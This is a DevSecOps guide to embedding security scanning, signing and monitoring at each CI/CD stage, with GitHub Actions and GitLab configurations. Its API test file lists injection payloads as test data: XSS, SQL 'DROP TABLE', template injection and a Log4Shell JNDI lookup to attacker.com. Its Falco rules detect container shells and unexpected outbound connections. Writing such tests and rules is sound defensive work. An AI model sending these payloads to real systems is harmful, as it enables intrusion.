# Security in CI/CD Pipelines

## Overview

| Field          | Value                                                          |
|----------------|----------------------------------------------------------------|
| **Domain**     | DevSecOps, Pipeline Security                                   |
| **Scope**      | Integrating security tools and gates at every CI/CD stage      |
| **Audience**   | DevOps Engineers, Developers, Security Engineers               |
| **Maturity**   | Industry standard, rapid tooling evolution                     |
| **Key Insight**| A well-secured pipeline catches 90%+ of vulnerabilities before they reach production |

---

## Pipeline Security Architecture

The modern CI/CD pipeline presents both an opportunity and a target. It is the ideal place to embed automated security checks because every code change passes through it. It is also a high-value target for attackers because compromising the pipeline means compromising every deployment.

### Security Tool Integration by Stage

```text
Pipeline Security Integration Points:

Pre-Commit        Commit/PR          Build              Test
+--------------+  +---------------+  +----------------+ +----------------+
| Secrets Scan |  | SAST          |  | Container Scan | | DAST Baseline  |
| Linting      |->| SCA           |->| SBOM Gen       |->| API Sec Tests  |
| Format Check |  | License Check |  | IaC Scan       | | Integration    |
| Local Tests  |  | Commit Sign   |  | Dep Verify     | | Security Tests |
+--------------+  +---------------+  +----------------+ +----------------+
                                                               |
Pre-Deploy          Deploy             Post-Deploy              |
+----------------+  +---------------+  +-----------------+     |
| Security Gate  |  | Artifact Sign |  | Runtime Monitor |<----+
| Change Approve |->| Audit Logging |->| DAST Full Scan  |
| Env Sec Check  |  | Canary Deploy |  | Pen Test        |
+----------------+  +---------------+  +-----------------+
```

---

## Stage 1: Pre-Commit

Pre-commit checks run on the developer's local machine before code is pushed to the repository. They provide the fastest feedback loop.

### Secrets Scanning

Prevent credentials, API keys, and tokens from entering the repository.

```yaml
# .pre-commit-config.yaml -- Secrets Detection
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args:
          - '--baseline'
          - '.secrets.baseline'
          - '--exclude-files'
          - '\.test\.'
          - '--exclude-files'
          - 'package-lock\.json'

  - repo: https://github.com/awslabs/git-secrets
    rev: master
    hooks:
      - id: git-secrets
        entry: git-secrets --scan
        language: script
```

**Initialize detect-secrets baseline:**

```bash
# Generate initial baseline (review carefully before committing)
detect-secrets scan --list-all-secrets > .secrets.baseline

# Audit the baseline to mark false positives
detect-secrets audit .secrets.baseline

# Update baseline when adding new legitimate patterns
detect-secrets scan --baseline .secrets.baseline
```

**Custom patterns for organization-specific secrets:**

```json
// .secrets.baseline (excerpt)
{
  "custom_plugin_paths": [],
  "exclude": {
    "files": "test_.*\\.py$|.*\\.test\\.js$",
    "lines": null
  },
  "plugins_used": [
    {"name": "ArtifactoryDetector"},
    {"name": "AWSKeyDetector"},
    {"name": "AzureStorageKeyDetector"},
    {"name": "BasicAuthDetector"},
    {"name": "CloudantDetector"},
    {"name": "DiscordBotTokenDetector"},
    {"name": "GitHubTokenDetector"},
    {"name": "HexHighEntropyString", "limit": 3.0},
    {"name": "IbmCloudIamDetector"},
    {"name": "JwtTokenDetector"},
    {"name": "KeywordDetector", "keyword_exclude": ""},
    {"name": "MailchimpDetector"},
    {"name": "NpmDetector"},
    {"name": "PrivateKeyDetector"},
    {"name": "SlackDetector"},
    {"name": "SoftlayerDetector"},
    {"name": "StripeDetector"},
    {"name": "TwilioKeyDetector"}
  ]
}
```

### Code Linting for Security

```yaml
# ESLint security plugin configuration (.eslintrc.yml)
extends:
  - eslint:recommended
  - plugin:security/recommended
  - plugin:no-unsanitized/DOM

plugins:
  - security
  - no-unsanitized

rules:
  security/detect-eval-with-expression: error
  security/detect-non-literal-fs-filename: warn
  security/detect-non-literal-require: warn
  security/detect-object-injection: warn
  security/detect-possible-timing-attacks: error
  security/detect-unsafe-regex: error
  no-unsanitized/method: error
  no-unsanitized/property: error
```

```ini
# Bandit configuration for Python (bandit.yaml)
# Run: bandit -r src/ -c bandit.yaml
skips: []
tests:
  - B101  # assert used
  - B102  # exec used
  - B103  # set bad file permissions
  - B104  # hardcoded bind all interfaces
  - B105  # hardcoded password string
  - B106  # hardcoded password funcarg
  - B107  # hardcoded password default
  - B108  # hardcoded tmp directory
  - B110  # try-except-pass
  - B112  # try-except-continue
  - B201  # flask debug true
  - B301  # pickle
  - B302  # marshal
  - B303  # insecure hash (md5, sha1)
  - B304  # insecure cipher
  - B305  # insecure cipher mode
  - B306  # mktemp_q
  - B307  # eval
  - B308  # mark_safe (Django)
  - B310  # urllib_urlopen
  - B311  # random
  - B312  # telnetlib
  - B320  # xml parsing
  - B321  # FTP
  - B323  # unverified SSL context
  - B324  # hashlib insecure
  - B501  # request with no cert validation
  - B502  # ssl with bad version
  - B503  # ssl with bad defaults
  - B504  # ssl with no version
  - B505  # weak cryptographic key
  - B506  # yaml load
  - B507  # ssh no host key verification
  - B601  # paramiko calls
  - B602  # subprocess popen shell=True
  - B603  # subprocess without shell
  - B604  # any other function with shell=True
  - B605  # start process with a shell
  - B606  # start process with no shell
  - B607  # start process with partial path
  - B608  # SQL injection (hardcoded)
  - B609  # wildcard injection
  - B610  # Django extra used
  - B611  # Django RawSQL used
  - B701  # jinja2 autoescape false
  - B702  # use of mako templates
  - B703  # Django mark_safe
```

---

## Stage 2: Commit/Pull Request

Security checks at the PR level provide the second layer of defense and enable team-level visibility.

### SAST (Static Application Security Testing)

#### Semgrep Configuration

```yaml
# .semgrep.yml -- Custom Rules + Registry Rules
rules:
  # Custom rule: Detect missing authorization check
  - id: missing-auth-decorator
    patterns:
      - pattern: |
          @app.route(...)
          def $FUNC(...):
              ...
      - pattern-not: |
          @app.route(...)
          @login_required
          def $FUNC(...):
              ...
      - pattern-not: |
          @app.route(...)
          @public_endpoint
          def $FUNC(...):
              ...
    message: |
      Route handler '$FUNC' is missing an authorization decorator.
      Add @login_required or @public_endpoint.
    severity: ERROR
    languages: [python]
    metadata:
      category: security
      cwe: "CWE-862: Missing Authorization"

  # Custom rule: Detect unsafe HTML rendering
  - id: unsafe-html-rendering
    pattern: |
      return render_template_string($INPUT, ...)
    message: |
      render_template_string with user input can lead to SSTI.
      Use render_template with a file instead.
    severity: ERROR
    languages: [python]
    metadata:
      category: security
      cwe: "CWE-94: Improper Control of Generation of Code"
```

#### CodeQL Configuration

```yaml
# .github/codeql/codeql-config.yml
name: "Custom CodeQL Configuration"
disable-default-queries: false
queries:
  - uses: security-extended
  - uses: security-and-quality

paths-ignore:
  - "**/test/**"
  - "**/tests/**"
  - "**/vendor/**"
  - "**/node_modules/**"
  - "**/*.test.js"
  - "**/*.spec.ts"

query-filters:
  - exclude:
      problem.severity: recommendation
```

```yaml
# .github/workflows/codeql.yml
name: CodeQL Analysis
on:
  pull_request:
    branches: [main, develop]
  schedule:
    - cron: '0 6 * * 1'  # Weekly Monday 6am

jobs:
  analyze:
    name: CodeQL Analysis
    runs-on: ubuntu-latest
    permissions:
      actions: read
      contents: read
      security-events: write
    strategy:
      fail-fast: false
      matrix:
        language: ['javascript', 'python']
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          config-file: .github/codeql/codeql-config.yml
          queries: security-extended

      - name: Autobuild
        uses: github/codeql-action/autobuild@v3

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v3
        with:
          category: "/language:${{ matrix.language }}"
```

### SCA (Software Composition Analysis)

```yaml
# .github/dependabot.yml
version: 2
registries:
  npm-registry:
    type: npm-registry
    url: https://npm.pkg.github.com
    token: ${{ secrets.NPM_TOKEN }}

updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 15
    labels:
      - "dependencies"
      - "security"
    reviewers:
      - "security-champions"
    groups:
      production-dependencies:
        dependency-type: "production"
      development-dependencies:
        dependency-type: "development"
        update-types:
          - "minor"
          - "patch"

  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 10

  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"

  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

```yaml
# Snyk CLI integration in pipeline
# .github/workflows/snyk.yml
name: Snyk Security Scan
on:
  pull_request:
    branches: [main]

jobs:
  snyk:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run Snyk to check for vulnerabilities
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: >-
            --severity-threshold=high
            --fail-on=upgradable
            --json-file-output=snyk-report.json

      - name: Upload Snyk report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: snyk-report
          path: snyk-report.json
```

### License Compliance Check

```yaml
# license-checker configuration
# .licensechecker.json
{
  "allowedLicenses": [
    "MIT",
    "Apache-2.0",
    "BSD-2-Clause",
    "BSD-3-Clause",
    "ISC",
    "0BSD",
    "BlueOak-1.0.0",
    "CC0-1.0",
    "Unlicense",
    "Python-2.0",
    "PSF-2.0"
  ],
  "deniedLicenses": [
    "GPL-2.0",
    "GPL-3.0",
    "AGPL-1.0",
    "AGPL-3.0",
    "SSPL-1.0",
    "EUPL-1.1",
    "CC-BY-SA-4.0"
  ],
  "excludePackages": [
    "@types/*"
  ],
  "failOnDenied": true,
  "failOnUnknown": true
}
```

### Commit Signing Verification

```yaml
# Branch protection rule enforcement (configured in GitHub)
# Require signed commits for all pushes to protected branches

# Developer setup for commit signing with GPG
# Step 1: Generate a GPG key
# gpg --full-generate-key

# Step 2: Configure Git to use the key
# git config --global user.signingkey <KEY_ID>
# git config --global commit.gpgsign true

# Step 3: Add GPG key to GitHub account
# gpg --armor --export <KEY_ID> | pbcopy

# Verify commit signatures in pipeline
# .github/workflows/verify-signatures.yml
name: Verify Commit Signatures
on:
  pull_request:
    branches: [main]

jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Verify all commits are signed
        run: |
          UNSIGNED=$(git log --format='%H %G?' origin/main..HEAD | grep -v ' G$' | grep -v ' U$')
          if [ -n "$UNSIGNED" ]; then
            echo "ERROR: Unsigned commits found:"
            echo "$UNSIGNED"
            exit 1
          fi
          echo "All commits are signed."
```

---

## Stage 3: Build

### Container Image Scanning

```yaml
# Trivy container scanning in GitHub Actions
- name: Build Docker image
  run: docker build -t myapp:${{ github.sha }} .

- name: Run Trivy vulnerability scanner
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: "myapp:${{ github.sha }}"
    format: "sarif"
    output: "trivy-results.sarif"
    severity: "CRITICAL,HIGH"
    exit-code: "1"
    ignore-unfixed: true
    vuln-type: "os,library"

- name: Upload Trivy scan results to GitHub Security tab
  uses: github/codeql-action/upload-sarif@v3
  if: always()
  with:
    sarif_file: "trivy-results.sarif"
```

```yaml
# Grype as an alternative scanner
- name: Scan image with Grype
  uses: anchore/scan-action@v4
  id: grype-scan
  with:
    image: "myapp:${{ github.sha }}"
    fail-build: true
    severity-cutoff: high
    output-format: sarif

- name: Upload Grype SARIF
  uses: github/codeql-action/upload-sarif@v3
  if: always()
  with:
    sarif_file: ${{ steps.grype-scan.outputs.sarif }}
```

### SBOM Generation

```yaml
# Generate Software Bill of Materials
- name: Generate SBOM with Syft
  uses: anchore/sbom-action@v0
  with:
    image: "myapp:${{ github.sha }}"
    format: spdx-json
    output-file: sbom.spdx.json
    artifact-name: sbom

- name: Generate CycloneDX SBOM
  run: |
    syft myapp:${{ github.sha }} -o cyclonedx-json > sbom.cyclonedx.json

- name: Attest SBOM to image
  uses: actions/attest-sbom@v1
  with:
    subject-name: ghcr.io/myorg/myapp
    subject-digest: ${{ steps.build.outputs.digest }}
    sbom-path: sbom.spdx.json
```

### Dependency Verification

```yaml
# Gradle dependency verification
# gradle/verification-metadata.xml (auto-generated)
# ./gradlew --write-verification-metadata sha256,pgp help

# NPM package integrity
# package-lock.json contains integrity hashes automatically
# Verify with: npm ci --ignore-scripts (then run scripts separately)

# Python pip hash checking
# requirements.txt with hashes
# pip install --require-hashes -r requirements.txt
```

```text
# requirements.txt with hash pinning
Flask==3.0.0 \
    --hash=sha256:21128f47e4e3b9d29d7e5fef8bf7e3c3aa1b0a07d144ae6ee8e2e1f58e04f2e1
requests==2.31.0 \
    --hash=sha256:58cd2187c01e70e6e26505bca751777aa9f2ee0b7f4300988b709f44e013003e
cryptography==41.0.7 \
    --hash=sha256:4c51b1e5e3cabc20194bca0cb4c849ddf2c16d8e1b49a7e8ced33ba58a5cd0a8
```

### IaC Security Scanning

```yaml
# Checkov IaC scanning
- name: Run Checkov
  uses: bridgecrewio/checkov-action@master
  with:
    directory: ./terraform
    framework: terraform
    output_format: sarif
    output_file_path: checkov-results.sarif
    soft_fail: false
    skip_check: CKV_AWS_144  # Skip cross-region replication if not needed
    compact: true

# tfsec as an alternative
- name: Run tfsec
  uses: aquasecurity/tfsec-action@v1.0.0
  with:
    working-directory: ./terraform
    soft_fail: false
    format: sarif
    additional_args: "--severity-override HIGH"
```

```hcl
# Example: Checkov-compliant Terraform
# checkov requirement: CKV_AWS_145 - Ensure RDS is encrypted at rest
resource "aws_db_instance" "main" {
  identifier     = "app-database"
  engine         = "postgresql"
  engine_version = "15.4"
  instance_class = "db.r6g.large"

  storage_encrypted   = true             # CKV_AWS_145
  kms_key_id          = aws_kms_key.rds.arn
  deletion_protection = true             # CKV_AWS_293

  backup_retention_period = 7            # CKV_AWS_133
  multi_az                = true

  db_subnet_group_name   = aws_db_subnet_group.private.name
  vpc_security_group_ids = [aws_security_group.db.id]

  # CKV_AWS_161: Ensure RDS database has IAM authentication enabled
  iam_database_authentication_enabled = true

  # CKV_AWS_118: Ensure enhanced monitoring is enabled
  monitoring_interval = 60
  monitoring_role_arn = aws_iam_role.rds_monitoring.arn

  # CKV_AWS_354: Ensure RDS performance insights are enabled
  performance_insights_enabled    = true
  performance_insights_kms_key_id = aws_kms_key.rds.arn

  tags = {
    Environment = "production"
    ManagedBy   = "terraform"
  }
}
```

---

## Stage 4: Test

### DAST (Dynamic Application Security Testing)

```yaml
# ZAP baseline scan against staging environment
- name: Deploy to staging
  run: ./deploy.sh staging

- name: Wait for staging to be healthy
  run: |
    for i in $(seq 1 30); do
      if curl -sf https://staging.example.com/health; then
        echo "Staging is healthy"
        exit 0
      fi
      sleep 10
    done
    echo "Staging health check failed"
    exit 1

- name: Run ZAP Baseline Scan
  uses: zaproxy/action-baseline@v0.12.0
  with:
    target: "https://staging.example.com"
    rules_file_name: "zap-rules.tsv"
    cmd_options: >-
      -a
      -j
      --auto
    allow_issue_writing: true
    fail_action: true
    artifact_name: zap-baseline-report
```

```text
# zap-rules.tsv -- Configure rule severity and behavior
# Format: rule_id\taction\tname
10010	WARN	Cookie No HttpOnly Flag
10011	WARN	Cookie Without Secure Flag
10015	FAIL	Incomplete or No Cache-control Header Set for HTTPS Content
10017	IGNORE	Cross-Domain JavaScript Source File Inclusion
10020	FAIL	X-Frame-Options Header
10021	FAIL	X-Content-Type-Options Header
10035	FAIL	Strict-Transport-Security Header
10036	WARN	HTTP Server Response Header
10038	FAIL	Content Security Policy (CSP) Header Not Set
10098	WARN	Cross-Domain Misconfiguration
10109	WARN	Modern Web Application
40012	FAIL	Cross Site Scripting (Reflected)
40014	FAIL	Cross Site Scripting (Persistent)
40018	FAIL	SQL Injection
40019	FAIL	SQL Injection - MySQL
40020	FAIL	SQL Injection - Hypersonic SQL
40021	FAIL	SQL Injection - Oracle
40022	FAIL	SQL Injection - PostgreSQL
90001	FAIL	Insecure JSF ViewState
90011	WARN	Charset Mismatch
```

### API Security Testing

```yaml
# API security test suite using pytest and requests
# test_api_security.py

import pytest
import requests
import jwt
import time

BASE_URL = "https://staging.example.com/api/v1"

class TestAuthenticationSecurity:
    """Verify authentication controls are enforced."""

    def test_unauthenticated_access_returns_401(self):
        response = requests.get(f"{BASE_URL}/users/me")
        assert response.status_code == 401

    def test_invalid_token_returns_401(self):
        headers = {"Authorization": "Bearer invalid-token-value"}
        response = requests.get(f"{BASE_URL}/users/me", headers=headers)
        assert response.status_code == 401

    def test_expired_token_returns_401(self):
        expired_token = jwt.encode(
            {"sub": "user123", "exp": int(time.time()) - 3600},
            "wrong-secret",
            algorithm="HS256"
        )
        headers = {"Authorization": f"Bearer {expired_token}"}
        response = requests.get(f"{BASE_URL}/users/me", headers=headers)
        assert response.status_code == 401

    def test_rate_limiting_enforced(self):
        """Verify rate limiting returns 429 after threshold."""
        responses = []
        for _ in range(110):
            r = requests.get(f"{BASE_URL}/public/health")
            responses.append(r.status_code)
        assert 429 in responses, "Rate limiting not enforced"

class TestAuthorizationSecurity:
    """Verify authorization controls prevent horizontal escalation."""

    def test_user_cannot_access_other_users_data(self, user_a_token, user_b_id):
        headers = {"Authorization": f"Bearer {user_a_token}"}
        response = requests.get(
            f"{BASE_URL}/users/{user_b_id}/profile",
            headers=headers
        )
        assert response.status_code in [403, 404]

    def test_regular_user_cannot_access_admin_endpoints(self, regular_user_token):
        headers = {"Authorization": f"Bearer {regular_user_token}"}
        response = requests.get(f"{BASE_URL}/admin/users", headers=headers)
        assert response.status_code == 403

class TestInputValidation:
    """Verify input validation prevents injection attacks."""

    @pytest.mark.parametrize("payload", [
        {"name": "<script>alert('xss')</script>"},
        {"name": "'; DROP TABLE users; --"},
        {"name": "{{7*7}}"},
        {"name": "${jndi:ldap://attacker.com/a}"},
    ])
    def test_malicious_input_rejected_or_sanitized(self, auth_headers, payload):
        response = requests.post(
            f"{BASE_URL}/items",
            json=payload,
            headers=auth_headers
        )
        if response.status_code == 200:
            body = response.json()
            assert "<script>" not in str(body)
            assert "DROP TABLE" not in str(body)

class TestSecurityHeaders:
    """Verify security headers are present in responses."""

    def test_security_headers_present(self):
        response = requests.get(f"{BASE_URL}/public/health")
        headers = response.headers

        assert headers.get("X-Content-Type-Options") == "nosniff"
        assert headers.get("X-Frame-Options") in ["DENY", "SAMEORIGIN"]
        assert "Strict-Transport-Security" in headers
        assert "Content-Security-Policy" in headers
        assert headers.get("X-XSS-Protection") == "0"  # Modern approach
        assert "Server" not in headers or "version" not in headers.get("Server", "").lower()
```

---

## Stage 5: Pre-Deploy

### Security Approval Gates

```yaml
# GitHub Actions environment protection rules
# Configure in repository Settings > Environments > production

# .github/workflows/deploy.yml
name: Production Deployment
on:
  push:
    branches: [main]

jobs:
  security-checks:
    runs-on: ubuntu-latest
    outputs:
      security_passed: ${{ steps.gate.outputs.passed }}
    steps:
      - uses: actions/checkout@v4

      - name: Verify all security scans passed
        id: gate
        run: |
          # Check SAST results
          SAST_CRITICAL=$(cat sast-results.json | jq '[.results[] | select(.severity == "CRITICAL")] | length')
          SAST_HIGH=$(cat sast-results.json | jq '[.results[] | select(.severity == "HIGH")] | length')

          # Check SCA results
          SCA_CRITICAL=$(cat sca-results.json | jq '[.vulnerabilities[] | select(.severity == "critical")] | length')

          # Check container scan results
          CONTAINER_CRITICAL=$(cat trivy-results.json | jq '[.Results[].Vulnerabilities[] | select(.Severity == "CRITICAL")] | length')

          echo "SAST Critical: $SAST_CRITICAL, High: $SAST_HIGH"
          echo "SCA Critical: $SCA_CRITICAL"
          echo "Container Critical: $CONTAINER_CRITICAL"

          if [ "$SAST_CRITICAL" -gt 0 ] || [ "$SCA_CRITICAL" -gt 0 ] || [ "$CONTAINER_CRITICAL" -gt 0 ]; then
            echo "passed=false" >> $GITHUB_OUTPUT
            echo "BLOCKED: Critical vulnerabilities found"
            exit 1
          fi

          if [ "$SAST_HIGH" -gt 5 ]; then
            echo "passed=false" >> $GITHUB_OUTPUT
            echo "BLOCKED: Too many high-severity findings ($SAST_HIGH)"
            exit 1
          fi

          echo "passed=true" >> $GITHUB_OUTPUT

  deploy-production:
    needs: security-checks
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.example.com
    steps:
      - name: Deploy to production
        run: ./deploy.sh production
```

### Environment-Specific Security Checks

```yaml
# Pre-deployment environment validation
- name: Validate production environment security
  run: |
    echo "Checking TLS configuration..."
    TLS_GRADE=$(curl -s "https://api.ssllabs.com/api/v3/analyze?host=app.example.com&fromCache=on" | jq -r '.endpoints[0].grade')
    if [[ "$TLS_GRADE" != "A" && "$TLS_GRADE" != "A+" ]]; then
      echo "FAIL: TLS grade is $TLS_GRADE, expected A or A+"
      exit 1
    fi

    echo "Checking security headers..."
    HEADERS_SCORE=$(curl -s "https://securityheaders.com/?q=app.example.com&followRedirects=on" -H "Accept: application/json" | jq -r '.grade')

    echo "Checking for exposed debug endpoints..."
    for endpoint in /debug /actuator /admin /swagger-ui.html /.env /wp-admin; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://app.example.com${endpoint}")
      if [ "$STATUS" != "404" ] && [ "$STATUS" != "403" ]; then
        echo "WARNING: $endpoint returned $STATUS (expected 404 or 403)"
      fi
    done
```

---

## Stage 6: Deploy

### Artifact Signing and Verification

```yaml
# Sign container images with Cosign
- name: Install Cosign
  uses: sigstore/cosign-installer@v3

- name: Sign container image
  run: |
    cosign sign \
      --key env://COSIGN_PRIVATE_KEY \
      --annotations "commit=${{ github.sha }}" \
      --annotations "pipeline=${{ github.run_id }}" \
      --annotations "actor=${{ github.actor }}" \
      ghcr.io/myorg/myapp@${{ steps.build.outputs.digest }}
  env:
    COSIGN_PRIVATE_KEY: ${{ secrets.COSIGN_PRIVATE_KEY }}
    COSIGN_PASSWORD: ${{ secrets.COSIGN_PASSWORD }}

# Verify before deployment
- name: Verify container image signature
  run: |
    cosign verify \
      --key env://COSIGN_PUBLIC_KEY \
      ghcr.io/myorg/myapp@${{ steps.build.outputs.digest }}
  env:
    COSIGN_PUBLIC_KEY: ${{ secrets.COSIGN_PUBLIC_KEY }}
```

### Deployment Audit Logging

```python
# deployment_audit.py -- Log all deployment events
import json
import datetime
import hashlib

def log_deployment_event(event_type, metadata):
    """Create an immutable audit log entry for deployment events."""
    event = {
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "event_type": event_type,
        "actor": metadata.get("actor"),
        "pipeline_id": metadata.get("pipeline_id"),
        "commit_sha": metadata.get("commit_sha"),
        "image_digest": metadata.get("image_digest"),
        "environment": metadata.get("environment"),
        "security_scan_status": metadata.get("security_scan_status"),
        "approval_status": metadata.get("approval_status"),
        "approver": metadata.get("approver"),
    }

    # Generate integrity hash
    event_json = json.dumps(event, sort_keys=True)
    event["integrity_hash"] = hashlib.sha256(event_json.encode()).hexdigest()

    # Send to immutable audit log (append-only storage)
    send_to_audit_log(event)
    return event

# Usage during deployment
log_deployment_event("deployment_started", {
    "actor": "ci-pipeline",
    "pipeline_id": "run-12345",
    "commit_sha": "abc123def456",
    "image_digest": "sha256:fedcba...",
    "environment": "production",
    "security_scan_status": "passed",
    "approval_status": "approved",
    "approver": "security-lead@example.com",
})
```

---

## Stage 7: Post-Deploy

### Runtime Security Monitoring

```yaml
# Falco runtime security rules for Kubernetes
- rule: Unexpected outbound connection
  desc: Detect outbound connections to unexpected destinations
  condition: >
    outbound and
    not (fd.ip in (allowed_outbound_ips)) and
    container and
    not (k8s.ns.name in (kube-system, monitoring))
  output: >
    Unexpected outbound connection
    (command=%proc.cmdline connection=%fd.name
     container=%container.name image=%container.image.repository)
  priority: WARNING
  tags: [network, security]

- rule: Write below /etc
  desc: Detect writes to /etc directory
  condition: >
    open_write and
    fd.directory = /etc and
    container and
    not proc.name in (systemd, dockerd)
  output: >
    Write to /etc detected
    (user=%user.name command=%proc.cmdline
     file=%fd.name container=%container.name)
  priority: ERROR
  tags: [filesystem, security]

- rule: Shell spawned in container
  desc: Detect interactive shells in containers
  condition: >
    spawned_process and
    container and
    proc.name in (bash, sh, zsh, dash, ksh) and
    proc.pname != entrypoint.sh
  output: >
    Shell spawned in container
    (user=%user.name shell=%proc.name parent=%proc.pname
     container=%container.name image=%container.image.repository)
  priority: WARNING
  tags: [process, security]
```

### Post-Deploy DAST Full Scan

```yaml
# Full DAST scan (runs nightly against production-like environment)
name: Nightly DAST Scan
on:
  schedule:
    - cron: '0 2 * * *'  # 2 AM daily

jobs:
  dast-full:
    runs-on: ubuntu-latest
    steps:
      - name: Run ZAP Full Scan
        uses: zaproxy/action-full-scan@v0.10.0
        with:
          target: "https://staging.example.com"
          rules_file_name: "zap-rules.tsv"
          cmd_options: >-
            -a
            -j
            -m 60
            --auto
          allow_issue_writing: true
          artifact_name: zap-full-report

      - name: Notify on critical findings
        if: failure()
        uses: slackapi/slack-github-action@v1
        with:
          payload: |
            {
              "text": "DAST Full Scan found critical vulnerabilities. Review: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
            }
        env:
          SLACK_WEBHOOK_URL: ${{ secrets.SECURITY_SLACK_WEBHOOK }}
```

---

## Complete Pipeline Examples

### GitHub Actions Complete Security Pipeline

```yaml
# .github/workflows/security-pipeline.yml
name: Complete Security Pipeline
on:
  pull_request:
    branches: [main, develop]
  push:
    branches: [main]

permissions:
  contents: read
  security-events: write
  pull-requests: write

jobs:
  # ---- Stage 1: Static Analysis ----
  secrets-scan:
    name: Secrets Detection
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  sast:
    name: SAST - Semgrep
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/owasp-top-ten
            p/security-audit
            .semgrep.yml
          generateSarif: "1"
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: semgrep.sarif

  sca:
    name: SCA - Dependency Check
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: snyk/actions/python@master
        continue-on-error: true
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high --sarif-file-output=snyk.sarif
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: snyk.sarif

  license-check:
    name: License Compliance
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npx license-checker --failOn "GPL-2.0;GPL-3.0;AGPL-3.0"

  # ---- Stage 2: Build Security ----
  build-and-scan:
    name: Build and Container Scan
    needs: [secrets-scan, sast, sca]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build Docker image
        run: docker build -t myapp:${{ github.sha }} .

      - name: Run Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: "myapp:${{ github.sha }}"
          format: "sarif"
          output: "trivy.sarif"
          severity: "CRITICAL,HIGH"
          exit-code: "1"

      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: trivy.sarif

      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          image: "myapp:${{ github.sha }}"
          format: spdx-json
          output-file: sbom.spdx.json

      - uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.spdx.json

  iac-scan:
    name: IaC Security Scan
    needs: [secrets-scan]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: bridgecrewio/checkov-action@master
        with:
          directory: ./terraform
          output_format: sarif
          output_file_path: checkov.sarif
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: checkov.sarif

  # ---- Stage 3: Dynamic Testing ----
  dast:
    name: DAST - ZAP Baseline
    needs: [build-and-scan]
    runs-on: ubuntu-latest
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to staging
        run: ./deploy.sh staging
      - uses: zaproxy/action-baseline@v0.12.0
        with:
          target: "https://staging.example.com"
          allow_issue_writing: true

  # ---- Stage 4: Security Gate ----
  security-gate:
    name: Security Quality Gate
    needs: [sast, sca, build-and-scan, iac-scan]
    runs-on: ubuntu-latest
    steps:
      - name: Evaluate security gate
        run: |
          echo "All security checks passed. Deployment approved."
```

### GitLab CI Security Pipeline

```yaml
# .gitlab-ci.yml
stages:
  - test
  - build
  - security
  - deploy

variables:
  SECURE_LOG_LEVEL: "info"

# ---- SAST ----
sast:
  stage: test
  image: returntocorp/semgrep
  script:
    - semgrep ci --config p/owasp-top-ten --config p/security-audit --sarif --output semgrep.sarif
  artifacts:
    reports:
      sast: semgrep.sarif
    paths:
      - semgrep.sarif
    when: always

# ---- Secret Detection ----
secret-detection:
  stage: test
  image:
    name: zricethezav/gitleaks
    entrypoint: [""]
  script:
    - gitleaks detect --source . --report-format sarif --report-path gitleaks.sarif
  artifacts:
    reports:
      secret_detection: gitleaks.sarif
    when: always

# ---- Dependency Scanning ----
dependency-scanning:
  stage: test
  image: snyk/snyk-cli:docker
  script:
    - snyk test --severity-threshold=high --json > snyk-report.json || true
    - snyk monitor
  artifacts:
    paths:
      - snyk-report.json
    when: always

# ---- Container Scanning ----
container-scanning:
  stage: build
  image:
    name: aquasec/trivy
    entrypoint: [""]
  script:
    - trivy image --severity CRITICAL,HIGH --exit-code 1 --format json -o trivy.json $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  artifacts:
    paths:
      - trivy.json
    when: always

# ---- IaC Scanning ----
iac-scanning:
  stage: security
  image:
    name: bridgecrew/checkov
    entrypoint: [""]
  script:
    - checkov -d ./terraform --output json --compact > checkov.json || true
  artifacts:
    paths:
      - checkov.json
    when: always

# ---- DAST ----
dast:
  stage: security
  image: ghcr.io/zaproxy/zaproxy:stable
  script:
    - zap-baseline.py -t $STAGING_URL -g gen.conf -J zap-report.json
  artifacts:
    paths:
      - zap-report.json
    when: always
  only:
    - main

# ---- Deploy with Security Gate ----
deploy-production:
  stage: deploy
  script:
    - ./deploy.sh production
  environment:
    name: production
    url: https://app.example.com
  when: manual
  only:
    - main
